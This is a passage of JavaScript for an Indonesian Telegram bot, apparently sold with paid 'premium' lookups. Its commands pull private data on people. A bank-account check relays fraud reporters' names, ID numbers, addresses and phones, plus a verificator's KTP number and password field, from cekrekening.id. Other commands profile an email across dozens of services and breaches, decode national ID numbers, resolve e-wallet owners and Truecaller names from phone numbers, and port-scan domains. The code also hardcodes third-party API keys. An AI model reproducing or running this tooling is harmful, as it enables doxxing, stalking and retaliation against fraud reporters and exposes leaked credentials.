                `Bank Name : ${bank.bankName}\nBank ID : ${bank.id}`
              );
              const data = {
                bankId: bank.id,
                bankAccountNumber: resp[0],
              };

              const headers2 = {
                authority: "cekrekening.id",
                accept: "application/json, text/plain, */*",
                "accept-language": "en-US,en;q=0.9,id;q=0.8",
                "cache-control": "no-cache",
                "content-type": "application/json",
                dnt: "1",
                origin: "https://cekrekening.id",
                pragma: "no-cache",
                referer: "https://cekrekening.id/home-card",
                "sec-ch-ua":
                  '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"Windows"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent":
                  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
              };

              axios
                .post(
                  "https://cekrekening.id/master/cekrekening/report",
                  data,
                  {
                    headers: headers2,
                  }
                )
                .then((response) => {
                  const { data } = response;
                  console.log(data.data);
                  if (data.status) {
                    if (data.data.laporan) {
                      const bankName = data.data.laporan.bank.bankName;
                      const accountNumber = data.data.laporan.accountNo;
                      const accountName = data.data.laporan.accountName;
                      const detailSumberMedia =
                        data.data.laporanDetail[0].detailSumberMedia;
                      const chronology = data.data.laporanDetail[0].chronology;
                      const alasanCancel =
                        data.data.laporanDetail[0].alasanCancel;
                      const disputed = data.data.laporanDetail[0].disputed;
                      //   const files = data.data.laporanDetail[0].files;
                      const description =
                        data.data.laporanDetail[0].description;
                      const kategoriAduan =
                        data.data.laporanDetail[0].kategoriAduan.deskripsi;
                      const bankCreatedAt = data.data.laporan.bank.createdAt;
                      const reporterAddress =
                        data.data.laporanDetail[0].reporterAddress;
                      const suspectPhoneNumber =
                        data.data.laporanDetail[0].suspectPhoneNumber;
                      const reporterEmail =
                        data.data.laporanDetail[0].reporterEmail;
                      const reporterFullname =
                        data.data.laporanDetail[0].reporterFullname;
                      const reporterIdNumber =
                        data.data.laporanDetail[0].reporterIdNumber;
                      const reporterPhoneNumber =
                        data.data.laporanDetail[0].reporterPhoneNumber;
                      const sumberMedia =
                        data.data.laporanDetail[0].sumberMedia.description;
                      const verificatorEmail =
                        data.data.laporanDetail[0].verificator.email;
                      const verificatorAddress =
                        data.data.laporanDetail[0].verificator.address;
                      const verificatorBank =
                        data.data.laporanDetail[0].verificator.bank;
                      const verificatorFullname =
                        data.data.laporanDetail[0].verificator.fullname;
                      const ktpno =
                        data.data.laporanDetail[0].verificator.ktpno;
                      const information =
                        data.data.laporanDetail[0].verificator.information;
                      const password =
                        data.data.laporanDetail[0].verificator.password;
                      const pathPhoto =
                        data.data.laporanDetail[0].verificator.pathPhoto;
                      const telpNo =
                        data.data.laporanDetail[0].verificator.telpNo;
                      const userAccess =
                        data.data.laporanDetail[0].verificator.userAccess;
                      const username =
                        data.data.laporanDetail[0].verificator.username;
                      // format the message you want to send to the Telegram bot
                      const message = `Bank ID : ${bank.id} \nBank Name: ${bankName} \nAccount Number: ${accountNumber} \nAccount Name: ${accountName} \nDetail Sumber Media: ${detailSumberMedia} \nChronology: ${chronology} \nAlasan Cancel: ${alasanCancel} \nDisputed: ${disputed} \nDescription: ${description} \nKategori Aduan: ${kategoriAduan} \nBank Created At: ${bankCreatedAt} \nReporter Address: ${reporterAddress} \nReporter Email: ${reporterEmail} \nReporter Fullname: ${reporterFullname} \nReporter Id Number: ${reporterIdNumber} \nReporter Phone Number: ${reporterPhoneNumber} \nSumber Media: ${sumberMedia} \nVerificator Email: ${verificatorEmail} \nVerificator Address: ${verificatorAddress} \nVerificator Bank: ${verificatorBank} \nVerificator Fullname: ${verificatorFullname} \nKTP No: ${ktpno} \nInformation: ${information} \nPassword: ${password} \nPath Photo: ${pathPhoto} \nTelp No: ${telpNo} \nMsisdn: ${suspectPhoneNumber} \nUser Access: ${userAccess} \nUsername: ${username}`;

                      console.log(message);

                      sendMessage(msg.chat.id, message);
                    } else {
                      console.log(data.message);
                      sendMessage(
                        msg.chat.id,
                        "Tidak terdapat laporan penipuan pada no rek ini!"
                      );
                    }
                  } else {
                    console.log(data.message);
                    sendMessage(
                      msg.chat.id,
                      "Tidak terdapat laporan penipuan pada no rek ini!"
                    );
                  }
                })
                .catch((error) => {
                  sendMessage(
                    msg.chat.id,
                    "Tidak terdapat laporan penipuan pada no rek ini!"
                  );
                  console.log(error);
                });

              // console.log( `Bank Name : ${bank.bankName}\nBank ID : ${bank.id}`);
            } else {
              console.log("tidak ditemukan bank dengan nama yang dicari");
            }
          }
        })
        .catch((error) => {
          console.log(error);
          sendMessage(
            msg.chat.id,
            "Tidak terdapat laporan penipuan pada no rek ini!"
          );
        });
      break;
    case "/email":
      if (!query)
        return sendMessage(
          chatId,
          "Masukan Email Seperti: /email contoh@gmail.com"
        );
      if (!isPremium)
        return sendMessage(
          chatId,
          "Fitur ini hanya untuk pengguna premium!\n\nKontak @rasirt2"
        );
      axios
        .get(
          `https://links.sergappteknologi.my.id/email.php?email=${encodeURIComponent(
            query
          )}`
        )
        .then((response) => {
          let result = "Informasi Email:\n"; // Initialize an empty string to store the result.
          const data = response.data;
          if (data.success) {
            result += "\nEmail:" + data.data.email;
            result += "\nScore:" + data.data.score;
            result += "\nDeliverable:" + data.data.deliverable;

            const domainDetails = data.data.domain_details;
            result += "\n\nDomain:" + domainDetails.domain;
            result +=
              "\nRegistered:" + (domainDetails.registered ? "Yes" : "No");
            result += "\nRegistrar:" + domainDetails.registrar_name;

            const accountDetails = data.data.account_details;

            // Informasi Google
            result +=
              "\n\nGoogle Registered:" +
              (accountDetails.google.registered ? "Yes" : "No");
            result +=
              "\nGoogle Photo:" +
              (accountDetails.google.photo || "Not Available");
            // Informasi LinkedIn
            result +=
              "\n\nLinkedIn Registered:" +
              (accountDetails.linkedin.registered ? "Yes" : "No");
            result +=
              "\nLinkedIn URL:" +
              (accountDetails.linkedin.url || "Not Available");
            result +=
              "\nLinkedIn Name:" +
              (accountDetails.linkedin.name || "Not Available");
            result +=
              "\nLinkedIn Company:" +
              (accountDetails.linkedin.company || "Not Available");
            result +=
              "\nLinkedIn Title:" +
              (accountDetails.linkedin.title || "Not Available");
            result +=
              "\nLinkedIn Location:" +
              (accountDetails.linkedin.location || "Not Available");
            result +=
              "\nLinkedIn Website:" +
              (accountDetails.linkedin.website || "Not Available");
            result +=
              "\nLinkedIn Twitter:" +
              (accountDetails.linkedin.twitter || "Not Available");
            result +=
              "\nLinkedIn Photo:" +
              (accountDetails.linkedin.photo || "Not Available");
            result +=
              "\nLinkedIn Connection Count:" +
              (accountDetails.linkedin.connection_count || 0);
            result +=
              "\n\nInstagram Registered:" +
              (accountDetails.instagram.registered ? "Yes" : "No");
            result +=
              "\nTwitter Registered:" +
              (accountDetails.twitter.registered ? "Yes" : "No");
            // Informasi Facebook
            result +=
              "\n\nFacebook Registered:" +
              (accountDetails.facebook.registered ? "Yes" : "No");
            result +=
              "\nFacebook URL:" +
              (accountDetails.facebook.url || "Not Available");
            result +=
              "\nFacebook Name:" +
              (accountDetails.facebook.name || "Not Available");
            result +=
              "\nFacebook Photo:" +
              (accountDetails.facebook.photo || "Not Available");
            result +=
              "\n\nGitHub Registered:" +
              (accountDetails.github.registered ? "Yes" : "No");
            result +=
              "\nSpotify Registered:" +
              (accountDetails.spotify.registered ? "Yes" : "No");
            result +=
              "\nPinterest Registered:" +
              (accountDetails.pinterest.registered ? "Yes" : "No");
            // Informasi Gravatar
            result +=
              "\n\nGravatar Registered:" +
              (accountDetails.gravatar.registered ? "Yes" : "No");
            result +=
              "\nGravatar Location:" +
              (accountDetails.gravatar.location || "Not Available");
            result +=
              "\nGravatar Name:" +
              (accountDetails.gravatar.name || "Not Available");
            result +=
              "\nGravatar Profile URL:" +
              (accountDetails.gravatar.profile_url || "Not Available");
            result +=
              "\nGravatar Username:" +
              (accountDetails.gravatar.username || "Not Available");
            result +=
              "\n\nMicrosoft Registered:" +
              (accountDetails.microsoft.registered ? "Yes" : "No");
            result +=
              "\nApple Registered:" +
              (accountDetails.apple.registered ? "Yes" : "No");
            result +=
              "\nEvernote Registered:" +
              (accountDetails.evernote.registered ? "Yes" : "No");
            result +=
              "\nTumblr Registered:" +
              (accountDetails.tumblr.registered ? "Yes" : "No");
            result +=
              "\nWordPress Registered:" +
              (accountDetails.wordpress.registered ? "Yes" : "No");

            // Informasi Airbnb
            result +=
              "\n\nAirbnb Registered:" +
              (accountDetails.airbnb.registered ? "Yes" : "No");
            result +=
              "\nAirbnb About:" +
              (accountDetails.airbnb.about || "Not Available");
            result +=
              "\nAirbnb Created At:" +
              (accountDetails.airbnb.created_at || "Not Available");
            result +=
              "\nAirbnb First Name:" +
              (accountDetails.airbnb.first_name || "Not Available");
            result +=
              "\nAirbnb Identity Verified:" +
              (accountDetails.airbnb.identity_verified || "Not Available");
            result +=
              "\nAirbnb Location:" +
              (accountDetails.airbnb.location || "Not Available");
            result +=
              "\nAirbnb Image:" +
              (accountDetails.airbnb.image || "Not Available");
            result +=
              "\nAirbnb Reviewee Count:" +
              (accountDetails.airbnb.reviewee_count || "Not Available");
            result +=
              "\nAirbnb Trips:" +
              (accountDetails.airbnb.trips || "Not Available");
            result +=
              "\nAirbnb Work:" +
              (accountDetails.airbnb.work || "Not Available");
            result +=
              "\n\nAmazon Registered:" +
              (accountDetails.amazon.registered ? "Yes" : "No");
            result +=
              "\nAdobe Registered:" +
              (accountDetails.adobe.registered ? "Yes" : "No");
            result +=
              "\nMail.ru Registered:" +
              (accountDetails.mailru.registered ? "Yes" : "No");
            result +=
              "\nImgur Registered:" +
              (accountDetails.imgur.registered ? "Yes" : "No");
            result +=
              "\nNetflix Registered:" +
              (accountDetails.netflix.registered ? "Yes" : "No");
            result +=
              "\nRambler Registered:" +
              (accountDetails.rambler.registered ? "Yes" : "No");
            result +=
              "\nZoho Registered:" +
              (accountDetails.zoho.registered ? "Yes" : "No");
            result +=
              "\nEnvato Registered:" +
              (accountDetails.envato.registered ? "Yes" : "No");
            result +=
              "\nPatreon Registered:" +
              (accountDetails.patreon.registered ? "Yes" : "No");
            result +=
              "\nTokopedia Registered:" +
              (accountDetails.tokopedia.registered ? "Yes" : "No");
            result +=
              "\nBooking Registered:" +
              (accountDetails.booking.registered ? "Yes" : "No");
            result +=
              "\nBukalapak Registered:" +
              (accountDetails.bukalapak.registered ? "Yes" : "No");
            result +=
              "\nArchive.org Registered:" +
              (accountDetails.archiveorg.registered ? "Yes" : "No");
            result +=
              "\nLazada Registered:" +
              (accountDetails.lazada.registered ? "Yes" : "No");
            result +=
              "\nSamsung Registered:" +
              (accountDetails.samsung.registered ? "Yes" : "No");
            result +=
              "\nQuora Registered:" +
              (accountDetails.quora.registered ? "Yes" : "No");
            result +=
              "\nAtlassian Registered:" +
              (accountDetails.atlassian.registered ? "Yes" : "No");
            // Informasi Flickr
            result +=
              "\n\nFlickr Registered:" +
              (accountDetails.flickr.registered ? "Yes" : "No");
            result +=
              "\nFlickr Username:" +
              (accountDetails.flickr.username || "Not Available");
            // Informasi Foursquare
            result +=
              "\n\nFoursquare Registered:" +
              (accountDetails.foursquare.registered ? "Yes" : "No");
            result +=
              "\nFoursquare Bio:" +
              (accountDetails.foursquare.bio || "Not Available");
            result +=
              "\nFoursquare Photo:" +
              (accountDetails.foursquare.photo || "Not Available");
            result +=
              "\nFoursquare Profile URL:" +
              (accountDetails.foursquare.profile_url || "Not Available");
            result +=
              "\n\nGitHub Registered:" +
              (accountDetails.github.registered ? "Yes" : "No");
            // Informasi Skype
            result +=
              "\n\nSkype Registered:" +
              (accountDetails.skype.registered ? "Yes" : "No");
            result +=
              "\nSkype Country:" +
              (accountDetails.skype.country || "Not Available");
            result +=
              "\nSkype City:" + (accountDetails.skype.city || "Not Available");
            result +=
              "\nSkype Gender:" +
              (accountDetails.skype.gender || "Not Available");
            result +=
              "\nSkype Name:" + (accountDetails.skype.name || "Not Available");
            result +=
              "\nSkype ID:" + (accountDetails.skype.id || "Not Available");
            result +=
              "\nSkype Handle:" +
              (accountDetails.skype.handle || "Not Available");
            result +=
              "\nSkype Bio:" + (accountDetails.skype.bio || "Not Available");
            result +=
              "\nSkype Age:" + (accountDetails.skype.age || "Not Available");
            result +=
              "\nSkype Language:" +
              (accountDetails.skype.language || "Not Available");
            result +=
              "\nSkype State:" +
              (accountDetails.skype.state || "Not Available");
            result +=
              "\nSkype Photo:" +
              (accountDetails.skype.photo || "Not Available");
            // Informasi OK
            result +=
              "\n\nOK Registered:" +
              (accountDetails.ok.registered ? "Yes" : "No");
            result +=
              "\nOK City:" + (accountDetails.ok.city || "Not Available");
            result += "\nOK Age:" + (accountDetails.ok.age || "Not Available");
            result +=
              "\nOK Date Joined:" +
              (accountDetails.ok.date_joined || "Not Available");
            result +=
              "\n\nKakao Registered:" +
              (accountDetails.kakao.registered ? "Yes" : "No");
            result +=
              "\nDisneyPlus Registered:" +
              (accountDetails.disneyplus.registered ? "Yes" : "No");
            result +=
              "\nJdid Registered:" +
              (accountDetails.jdid.registered ? "Yes" : "No");
            result +=
              "\nFlipkart Registered:" +
              (accountDetails.flipkart.registered ? "Yes" : "No");
            result +=
              "\nBooking Registered:" +
              (accountDetails.booking.registered ? "Yes" : "No");
            result +=
              "\nAirbnb Registered:" +
              (accountDetails.airbnb.registered ? "Yes" : "No");
            result +=
              "\nAmazon Registered:" +
              (accountDetails.amazon.registered ? "Yes" : "No");
            result +=
              "\nQzone Registered:" +
              (accountDetails.qzone.registered ? "Yes" : "No");
            result +=
              "\nAdobe Registered:" +
              (accountDetails.adobe.registered ? "Yes" : "No");
            result +=
              "\nMail.ru Registered:" +
              (accountDetails.mailru.registered ? "Yes" : "No");
            result +=
              "\nWordPress Registered:" +
              (accountDetails.wordpress.registered ? "Yes" : "No");
            result +=
              "\nImgur Registered:" +
              (accountDetails.imgur.registered ? "Yes" : "No");
            result +=
              "\nDisneyPlus Registered:" +
              (accountDetails.disneyplus.registered ? "Yes" : "No");
            result +=
              "\nNetflix Registered:" +
              (accountDetails.netflix.registered ? "Yes" : "No");
            result +=
              "\nJdid Registered:" +
              (accountDetails.jdid.registered ? "Yes" : "No");
            result +=
              "\nFlipkart Registered:" +
              (accountDetails.flipkart.registered ? "Yes" : "No");
            result +=
              "\nBukalapak Registered:" +
              (accountDetails.bukalapak.registered ? "Yes" : "No");
            result +=
              "\nArchive.org Registered:" +
              (accountDetails.archiveorg.registered ? "Yes" : "No");
            result +=
              "\nLazada Registered:" +
              (accountDetails.lazada.registered ? "Yes" : "No");
            result +=
              "\nZoho Registered:" +
              (accountDetails.zoho.registered ? "Yes" : "No");
            result +=
              "\nSamsung Registered:" +
              (accountDetails.samsung.registered ? "Yes" : "No");
            result +=
              "\nEvernote Registered:" +
              (accountDetails.evernote.registered ? "Yes" : "No");
            result +=
              "\nEnvato Registered:" +
              (accountDetails.envato.registered ? "Yes" : "No");
            result +=
              "\nPatreon Registered:" +
              (accountDetails.patreon.registered ? "Yes" : "No");
            result +=
              "\nTokopedia Registered:" +
              (accountDetails.tokopedia.registered ? "Yes" : "No");
            result +=
              "\nRambler Registered:" +
              (accountDetails.rambler.registered ? "Yes" : "No");
            result +=
              "\nQuora Registered:" +
              (accountDetails.quora.registered ? "Yes" : "No");
            result +=
              "\nAtlassian Registered:" +
              (accountDetails.atlassian.registered ? "Yes" : "No");

            const breachDetails = data.data.breach_details;
            result +=
              "\n\nNumber of Breaches:" + breachDetails.number_of_breaches;
            breachDetails.breaches.forEach((breach) => {
              result += "\n\nBreach Name:" + breach.name;
              result += "\nBreach Domain:" + breach.domain;
              result += "\nBreach Date:" + breach.date;
            });

            const appliedRules = data.data.applied_rules;
            appliedRules.forEach((rule) => {
              result += "\nRule ID:" + rule.id;
              result += "\nRule Name:" + rule.name;
            });

            sendMessage(chatId, result);
          } else {
            sendMessage(chatId, "Terjadi error!");
          }
        })
        .catch((error) => {
          console.error("Terjadi Error!");
        });

      break;
    case "/blogger":
      if (!query)
        return sendMessage(
          chatId,
          "Masukan URL Blogger Seperti: /blogger https://tamanandroidku.blogspot.com"
        );
      axios
        .get(
          `https://api.zahwazein.xyz/information/blogger?apikey=zenzkey_bff36c6fa327&url=${encodeURIComponent(
            QUERY
          )}`
        )
        .then((response) => {
          const data = response.data;
          if (data.status === "OK") {
            sendMessage(chatId, `Result: ${data.result}`);
          } else {
            sendMessage(chatId, "Failed to retrieve data:" + data.error);
          }
        })
        .catch((error) => {
          sendMessage(chatId, "Error:" + error.message);
        });
      break;
    case "/nik":
      if (!query)
        return sendMessage(chatId, "Masukan NIK Seperti: /nik 30304690965XXXX");
      const ktpInfo = await getKTPInfo(query);
      const message = `Informasi KTP:\nNIK: ${ktpInfo.nik}\nProvinsi: ${ktpInfo.provinsi}\nKota/Kabupaten: ${ktpInfo.kota}\nKecamatan: ${ktpInfo.kecamatan}\nJenis Kelamin: ${ktpInfo.kelamin}\nTanggal Lahir: ${ktpInfo.lahir}\nZodiac: ${ktpInfo.zodiac}\nUmur: ${ktpInfo.umur}`;
      sendMessage(msg.chat.id, message);
      break;
    case "/wallet":
      if (!query)
        return sendMessage(
          chatId,
          "Masukan Nomor HP Seperti: /wallet 62XXXXXX"
        );
      if (!isPremium)
        return sendMessage(
          chatId,
          "Fitur ini hanya untuk pengguna premium!\n\nKontak @rasirt2"
        );
      let nomor = "0" + query.substring(2);
      sendMessage(chatId, "Oke, Proses!");

      const api_key =
        "DMlPLTIEpLazu1AFSgsCrlt2zLs99kOBQTFQQlmdPAnYqlA5UcfIC08RmDSnM6iabn8qhf93YKGjBAylaRIlGNbEZIlrtAYYFYhH";
      const type = "ERP";
      const erp_type = "E";
      const kodeEwallet = ["DANA", "OVO", "GOPAY", "ISAKU", "GRAB", "GOJEK"];
      const hasilEwallet = {};

      try {
        for (const namaEwallet of kodeEwallet) {
          const url = `https://toolcek.my.id/api?api_key=${api_key}&type=${type}&erp_type=${erp_type}&erp_code=${namaEwallet}&erp_target=${nomor}`;
          const response = await axios.get(url);
          const json = response.data;

          if (json.data && json.data.name) {
            hasilEwallet[namaEwallet] = json.data.name;
          } else {
            hasilEwallet[namaEwallet] = "N/A";
          }
        }

        let pesan = "+++++ [EWALLET SERVER 2] +++++\n";
        for (const namaEwallet in hasilEwallet) {
          pesan += `Nama ${namaEwallet} : ${hasilEwallet[namaEwallet]}\n`;
        }

        sendMessage(chatId, pesan);

        const resp = query;
        let wallet = "";

        async function fetchEwalletData(api_url, serviceName) {
          try {
            const response = await axios.get(api_url);
            const ph = response.data;
            if (ph.name) {
              wallet += `\n${serviceName} ${resp} a/n ${ph.name}`;
            } else {
              wallet += `\nAKUN ${serviceName} TIDAK DITEMUKAN!`;
            }
          } catch (error) {
            console.log(
              `++++++++ [WALLET NAME] +++++++\nERROR ${serviceName} CHECKING!`
            );
            wallet += `\nERROR CHECKING!`;
          }
        }

        await fetchEwalletData(
          `https://rasitechchannel.my.id/api_ewallet/dana/?hp=${resp}`,
          "DANA"
        );
        await fetchEwalletData(
          `https://rasitechchannel.my.id/api_ewallet/shopeepay/?hp=${resp}`,
          "ShopeePay"
        );
        await fetchEwalletData(
          `https://rasitechchannel.my.id/api_ewallet/ovo/?hp=${resp}`,
          "OVO"
        );
        await fetchEwalletData(
          `https://rasitechchannel.my.id/api_ewallet/gopay/?hp=${resp}`,
          "GOPAY"
        );
        await fetchEwalletData(
          `https://rasitechchannel.my.id/api_ewallet/isaku/?hp=${resp}`,
          "ISAKU"
        );
        await fetchEwalletData(
          `https://rasitechchannel.my.id/api_ewallet/linkaja/?hp=${resp}`,
          "LINKAJA"
        );

        sendMessage(chatId, `++++++++ [WALLET NAME] +++++++\n${wallet}`);
      } catch (error) {
        console.log(error);
      }
      break;
    case "/msisdn":
      if (!query)
        return sendMessage(
          chatId,
          "Masukan Nomor HP Seperti: /msisdn 62XXXXXX"
        );
      if (!isPremium)
        return sendMessage(
          chatId,
          "Fitur ini hanya untuk pengguna premium!\n\nKontak @rasirt2"
        );
      var searchData = {
        number: query,
        countryCode: "ID",
        installationId:
        config.truecaller,
        output: "TEXT",
      };

      var sn = truecallerjs.searchNumber(searchData);
      sn.then(function (response) {
        bot.sendMessage(
          chatId,
          `++++++++ [PHONE NUMBER SEARCH] ++++++++\n\n${response.replace(
            /[\u001b\u009b][[()#;?]*(?:[0-9]{1,4}(?:;[0-9]{0,4})*)?[0-9A-ORZcf-nqry=><]/g,
            ""
          )}`
        );
      }).catch((err) => {
        bot.sendMessage(
          chatId,
          `++++++++ [ERROR] ++++++++\n\nNOMOR ERROR!\n\n${err}`
        );
      });

      break;
    case "/nomor":
      if (!query)
        return sendMessage(chatId, "Masukan Nomor HP Seperti: /nomor 62XXXXXX");
      if (!isPremium)
        return sendMessage(
          chatId,
          "Fitur ini hanya untuk pengguna premium!\n\nKontak @rasirt2"
        );
      sendMessage(chatId, "Oke, Prosess!");

      var lists = "";
      axios
        .get("https://links.sergappteknologi.my.id/son.php?no=" + query)
        .then(function (response) {
          var account_details = response.data.data.account_details;
          Object.entries(account_details).forEach(([key, value]) => {
            if (typeof value === "object") {
              Object.entries(value).forEach(([subkey, subvalue]) => {
                if (subvalue != null) {
                  if (subvalue != false) {
                    if (subkey === "photo") {
                      const filePath = "image.png";

                      // menghapus file jika file sudah ada
                      fs.unlink(filePath, (err) => {
                        if (err) {
                          console.log(err);
                        } else {
                          // data gambar dalam format base64
                          const imageData = subvalue;

                          // menghapus header "data:image/png;base64," dari data gambar
                          const base64Data = imageData.replace(
                            /^data:image\/\w+;base64,/,
                            ""
                          );

                          // menyimpan data gambar ke file
                          fs.writeFile(
                            filePath,
                            base64Data,
                            "base64",
                            function (err) {
                              if (err) {
                                console.log(err);
                              } else {
                                console.log(
                                  `Gambar tersimpan ke file ${filePath}`
                                );
                                bot.sendPhoto(chatId, filePath);
                              }
                            }
                          );
                        }
                      });
                    } else {
                      console.log(key + " " + subkey + ": " + subvalue);
                      lists += key + " " + subkey + ": " + subvalue + "\n";
                    }
                  }
                }
              });
            } else {
              console.log(key + ": " + value);
              lists += key + ": " + value + "\n\n";
            }
          });
        })
        .then(() => {
          sendMessage(
            chatId,
            "++++++++ [PHONE NUMBER CHECKER] +++++++\n\n" + lists
          );
        })
        .catch(() => {
          sendMessage(chatId, "TERJADI KESALAHAN!");
        });
      break;
    case "/lookup":
      if (!query)
        return sendMessage(
          chatId,
          "Masukan ID Telegram Seperti: /lookup 123456789"
        );
      bot
        .getChat(query)
        .then((users) => {
          bot
            .getUserProfilePhotos(query)
            .then((user) => {
              console.log(user);
              const name = users.first_name;
              const username = users.username || "Tidak Ada";
              const bio = users.bio || "Tidak Ada";
              if (user.photos.length > 0) {
                bot.sendPhoto(chatId, user.photos[0][0].file_id, {
                  caption: `Nama: ${name}\nUsername: @${username}\nBio: ${bio}\nUser ID: ${query}`,
                });
                sendMessage(
                  chatId,
                  `Mention: <a href="tg://user?id=${query}">Mention</a>`,
                  { parse_mode: "HTML" }
                );
              } else {
                sendMessage(
                  chatId,
                  `Nama: ${name}\nUsername: @${username}\nBio: ${bio}\nUser ID: ${query}\nMention: <a href="tg://user?id=${query}">Mention</a>`,
                  { parse_mode: "HTML" }
                );
              }
            })
            .catch((err) => {
              sendMessage(chatId, "Error: " + err);
            });
        })
        .catch((err) => {
          sendMessage(chatId, "Error: " + err);
        });
      break;
    case "/penipu":
      if (!query)
        return sendMessage(
          chatId,
          "Masukan NoHp/NoRek/Username: /penipu NoHp/NoRek/Username"
        );
      const check = query;
      const result = reports.find((r) => r.report === check);
      if (result) {
        sendMessage(
          msg.chat.id,
          `Status Cek Fraud untuk ${check}: Ditemukan laporan dari ${result.users.length} pengguna.`
        );
      } else {
        sendMessage(
          msg.chat.id,
          `Status Cek Fraud untuk ${check}: Tidak ditemukan laporan.`
        );
      }
      break;
    case "/report":
    case "/lapor":
      if (!query)
        return sendMessage(
          chatId,
          "Masukan NoHp/NoRek/Username Seperti: /lapor NoHp/NoRek/Username"
        );
      const report = query;
      const existingReport = reports.find((r) => r.report === report);
      if (existingReport) {
        const existingUserReport = existingReport.users.find(
          (u) => u === msg.from.username
        );
        if (existingUserReport) {
          sendMessage(
            msg.chat.id,
            `Anda sudah melaporkan nomor ini sebelumnya.`
          );
          return;
        }
        existingReport.users.push(msg.from.username);
        if (existingReport.users.length >= 10) {
          sendMessage(
            msg.chat.id,
            `Nomor ini telah dilaporkan ${
              existingReport.users.length
            }x oleh ${existingReport.users
              .map((u) => `@${u}`)
              .join(", ")}. Terima kasih atas bantuannya.`
          );
          return;
        }
      } else {
        reports.push({
          report: report,
          users: [msg.from.username],
        });
      }
      fs.writeFileSync(reportsFile, JSON.stringify(reports), "utf-8");
      sendMessage(
        msg.chat.id,
        `Laporan Fraud: ${report} telah diterima. Terima kasih atas bantuannya.`
      );
      break;
    case "/nohp":
      if (!query)
        return sendMessage(chatId, "Masukan Nomor HP Seperti: /nohp 62XXXXXX");
      const apiURL = `https://api.zahwazein.xyz/information/phoneinfo?apikey=zenzkey_bff36c6fa327&query=${query}`;

      try {
        const response = await axios.get(apiURL);
        if (response.data.status === "OK") {
          let counter = 1;
          const result = response.data.result;
          let message = "";

          message += `<b>Social Media:</b>\n`;
          if (result.social_media.length > 0) {
            for (const media of result.social_media) {
              message += `${counter}. <a href="${media.url}">Social Media</a>\n`;
              counter++;
            }
          } else {
            message += `No data found.\n`;
          }

          message += `\n<b>Disposable Providers:</b>\n`;
          if (result.disposable_providers.length > 0) {
            for (const provider of result.disposable_providers) {
              message += `${counter}. <a href="${provider.url}">Disposable Providers</a>\n`;
              counter++;
            }
          } else {
            message += `No data found.\n`;
          }

          message += `\n<b>Individuals:</b>\n`;
          if (result.individuals.length > 0) {
            for (const individuals of result.individuals) {
              message += `${counter}. <a href="${individuals.url}">Individuals</a>\n`;
              counter++;
            }
          } else {
            message += `No data found.\n`;
          }

          message += `\n<b>Reputation:</b>\n`;
          if (result.reputation.length > 0) {
            for (const reputation of result.reputation) {
              message += `${counter}. <a href="${reputation.url}">Reputation</a>\n`;
              counter++;
            }
          } else {
            message += `No data found.\n`;
          }

          message += `\n<b>General:</b>\n`;
          if (result.general.length > 0) {
            for (const general of result.general) {
              message += `${counter}. <a href="${general.url}">General</a>\n`;
              counter++;
            }
          } else {
            message += `No data found.\n`;
          }

          bot.sendMessage(chatId, message, { parse_mode: "HTML" });
        } else {
          sendMessage(chatId, "Terjadi masalah pada nomor hp!");
        }
      } catch (error) {
        sendMessage(chatId, "Terjadi masalah pada nomor hp!");
      }
      break;
    case "/github":
      if (!query)
        return sendMessage(
          chatId,
          "Masukan Username Github Seperti: /github rasitechchannel"
        );
      try {
        const response = await axios.get(
          `https://api.zahwazein.xyz/stalker/github?username=${query}&apikey=rasitech`
        );
        const data = response.data.result;

        // Create the caption for the photo
        let caption = `<b>${data.login.toUpperCase()}</b>\n`;
        caption += `Name: ${data.name || "-"}\n`;
        caption += `Location: ${data.location || "-"}\n`;
        caption += `Bio: ${data.bio || "-"}\n`;
        caption += `Followers: ${data.followers}\n`;
        caption += `Following: ${data.following}\n`;
        caption += `Public Repositories: ${data.public_repos}\n`;
        caption += `Website: ${
          data.blog ? '<a href="' + data.blog + '">Link</a>' : "-"
        }`;

        // Add links to the caption
        caption += `\nGitHub Profile : <a href="${data.html_url}">GitHub Profile</a>`;
        caption += `\nFollowers : <a href="${data.followers_url}">Followers</a>`;
        caption += `\nFollowing : <a href="${data.following_url}">Following</a>`;
        caption += `\nGist : <a href="${data.gists_url}">Gists</a>`;
        caption += `\nStarred : <a href="${data.starred_url}">Starred</a>`;
        caption += `\nSubscriptions : <a href="${data.subscriptions_url}">Subscriptions</a>`;
        caption += `\nOrganizations : <a href="${data.organizations_url}">Organizations</a>`;
        caption += `\nRepositories : <a href="${data.repos_url}">Repositories</a>`;
        caption += `\nEvents : <a href="${data.events_url}">Events</a>`;
        caption += `\nReceived Events : <a href="${data.received_events_url}">Received Events</a>`;

        // Send the photo with the caption
        bot.sendPhoto(chatId, data.avatar_url, {
          caption: caption,
          parse_mode: "HTML",
        });
      } catch (error) {
        console.log(error);
        sendMessage(chatId, "Error: Failed to get data from API.");
      }
      break;
    case "/whois":
      if (!query)
        return sendMessage(
          chatId,
          "Masukan Domain Seperti: /domain google.com"
        );
      try {
        const whoisData = await whoisJson(query);

        let response = "";
        for (const key in whoisData) {
          if (!whoisData[key].includes("REDACTED")) {
            response += `*${key}:* ${whoisData[key]}\n`;
          }
        }

        sendMessage(chatId, response, { parse_mode: "Markdown" });
      } catch (error) {
        sendMessage(
          chatId,
          "An error occurred while fetching the WHOIS information."
        );
      }
      break;
    case "/portscan":
      if (!query)
        return sendMessage(
          chatId,
          "Masukan Dommain Seperti: /portscan google.com"
        );
      const website = query;
      sendMessage(chatId, `Scanning ports for ${website}...`);

      await Promise.allSettled(
        Object.keys(portsList).map(async (port, index) => {
          await sleep(index * 400);
          await checkPort(chatId, port, website);
        })
      ).then(() => {
        sendMessage(chatId, prt, { parse_mode: "HTML" });
      });
      break;
    case "/domage":
      if (!query)
        return sendMessage(
          chatId,
          "Masukan Domain Seperti: /domage google.com"
        );
      var domage = "";
      const whoisData = await whoisJson(query);
      for (const key in whoisData) {
        if (key.includes("date") || key.includes("Date")) {
          if (!key.includes("Database")) {
            domage += `<b>${key} :</b> ${moment(whoisData[key]).format(
              "Do MMMM YYYY h:mm:ss a"
            )}\n`;
          }
        }
        if (key.includes("creationDate")) {
          domage += `<b>Website Age :</b> ${moment(
            whoisData.creationDate
          ).fromNow(true)}\n`;
        }
      }
      sendMessage(chatId, domage, { parse_mode: "HTML" });
      break;
